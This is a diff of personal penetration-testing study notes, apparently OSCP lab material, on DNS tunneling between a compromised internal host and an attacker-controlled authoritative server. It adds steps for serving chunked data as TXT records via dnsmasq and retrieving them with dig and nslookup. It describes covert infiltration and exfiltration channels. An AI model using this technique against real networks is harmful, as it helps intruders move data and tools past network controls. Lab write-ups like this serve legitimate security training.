@@ -18,7 +18,7 @@ Assume we've established a shell on both `PGDATABASE01` and `FELINEAUTHORITY`. W
 ### `dnsmasq`
 [_Dnsmasq_](https://thekelleys.org.uk/dnsmasq/doc.html) is a tool which we can use to setup a DNS server pretty easily using only a few configuration files. The conf files are usually stored in `~/dns_tunneling`. 
 
-To see how the DNS traffic flows b/w the two servers, we need to us `dnsmasq` on `FELINE` to make ig a functional DNS server. We can use the `dnsmasq.conf` configuration file for this:
+To see how the DNS traffic flows b/w the two servers, we need to us `dnsmasq` on `FELINE` to make it a functional DNS server. We can use the `dnsmasq.conf` configuration file for this:
 ```bash
 kali@felineauthority:~$ cd dns_tunneling
 
@@ -44,7 +44,7 @@ dnsmasq: cleared cache
 > [!Note]
 > We haven't created *any DNS records* so any requests sent to the server will receive a failure response.
 
-Remember to use [`tcpdump`](../../CLI-tools/linux/tcpdump.md)to capture traffic on `FELINE`'s `ens192` port so we can see *when DNS requests come in* (to port `53` by default):
+Remember to use [`tcpdump`](../../CLI-tools/linux/tcpdump.md)to capture traffic on `FELINE`'s `ens192` port so we can see *the DNS requests come in* (to port `53` by default):
 ```bash
 kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
 [sudo] password for kali: 
@@ -91,7 +91,7 @@ The request was first sent to port `53` on `PGD01`'s [loopback](../../networking
 > [!Note]
 >  If you want to query a DNS server directly, you can give `nslookup` the IP address of the server: `nslookup exfiltrated-data.feline.corp 192.168.50.64`
 
-Back on `FELINE` we should see the request query as output to our `tcpdump` command:
+Back on `FELINE` we should see the request query in the output to our `tcpdump` command:
 ```bash
 kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
 [sudo] password for kali: 
@@ -103,7 +103,81 @@ listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 ```
 These packets were sent to `FELINE` by `MULTISERVER`. In them we can see that a request was sent for the [A-record](../../networking/DNS/A-record.md) of `exfiltrated-data.feline.corp`. Since we have no A records for that domain on `FELINE`, `FELINE` responded with `NXDOMAIN`.
 ![](../oscp-pics/DNS-tunneling-3.png)
+Technically, the above picture does not show the requests made to *the [root](../../networking/DNS/DNS.md#The%20relevant%20Root%20NS...) name servers or the [Top Level Domain](../../networking/DNS/DNS.md#Top%20Level%20Domain)* (TLD) *name servers* which would have been sent *before* the request we end up seeing on `FELINE`. 
+## Leveraging the Above
+We've demonstrated thru this scenario that an internal host has *interacted with our external host* by sending an *arbitrary DNS query*. We can leverage this to *infiltrate data* onto `PGDATABASE01` from our external server.
+
+The DNS connection made b/w `PGD01` and `FELINE` was not a continuous or direct connection, but was small intermittent connections where chunks of information were passed from one to the other. 
+
+The fun thing about DNS is that DNS [`TXT` records](../../networking/DNS/TXT-record.md) can store data other than ASCII text including  *binary data*. So, we can use `TXT` records to *infiltrate binary data* onto `PGD01`. Unfortunately, `TXT` record strings are limited to a *255 byte length*. So storing a large binary file in `TXT` records will require multiple `TXT` records.
+### Plan
+If we want to get a binary file onto `PGD01`(or any kind of file), we can convert our binary file into a hex string, split the string into chunks and then create 255-byte TXT records for each chunk. We can then create TXT records on the *authoritative server `FELINEAUTHORITY`*. 
+
+Once the records are created and propery stored on `FELINE`, we can then use a tool like [dig](../../CLI-tools/dig.md) or `nslookup` on `PGDATABASE01` to retrieve each TXT record *from `FELINE`*.
+### Serving Records with `dnsmasq`
+To serve our TXT records, we can use `dnsmasq` again. First, we'll have to kill the previous `dnsmasq` process running on `FELINE`. Then we can *change `dnsmasq_txt.conf`* and start a new process with this new configuration.
+#### Update `dnsmasq_txt.conf`
+`dnsmasq_txt.conf` has a property called `txt-record`. This property can be set to a subdomain followed by a string of text which will make up the contents of a new TXT record on the subdomain. For example, if you want to make a TXT file on the `www.feline.corp` domain that stores the string `"TrshPuppy is a sup3r l33t hacker"`, your `dnsmasq_txt.conf` file should look like this:
+```bash
+kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+# TXT record
+txt-record=www.feline.corp,TrshPuppy is a sup3r l33t hacker
+```
+Once `dnsmasq_txt.conf` is updated, you need to *restart the process* to start the DNS server configured with the new TXT records for `www.feline.corp`
+### Infiltrating Records
+Back on our target machine `PGDATABASE01`, we can infiltrate the data stored on our new TXT records with either `dig` or `nslookup`:
+```bash
+# nslookup
+database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
+Server:		192.168.50.64
+Address:	192.168.50.64#53
+
+Non-authoritative answer:
+www.feline.corp	text = "TrshPuppy is a sup3r l33t hacker"
+
+Authoritative answers can be found from:
+
+database_admin@pgdatabase01:~$
+
+# dig
+dig www.feline.corp txt
+
+; <<>> DiG 9.10.6 <<>> www.feline.corp txt
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58794
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4095
+;; QUESTION SECTION:
+;www.feline.corp.			IN	TXT
+
+;; ANSWER SECTION:
+www.feline.corp.		300	IN	TXT	"TrshPuppy is a sup3r l33t hacker"
+
+;; Query time: 69 msec
+;; SERVER: 192.168.50.64#53(192.168.50.64)
+;; WHEN: Wed May 21 16:35:47 PDT 2025
+;; MSG SIZE  rcvd: 121
+```
+#### Bonus!
+Since you want to infiltrate a bunch of chunks of binary and/ or hex data, you probably want to automate this right? Well, instead of having to parse through the entire output *from `dig`*, you can use the `+short` flag so the response *just includes the content of the `TXT` file*:
+ ```bash
+dig +short www.feline.corp txt
+"TrshPuppy is a sup3r l33t hacker"
+```
+Just remember to *chop the quotations* off the output before you try to splice them back together to get your binary file.
 
 > [!Resources]
 > - [_Dnsmasq_](https://thekelleys.org.uk/dnsmasq/doc.html)
 > - [_systemd-resolved_](https://manpages.ubuntu.com/manpages/xenial/man8/systemd-resolved.service.8.html)
+> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.
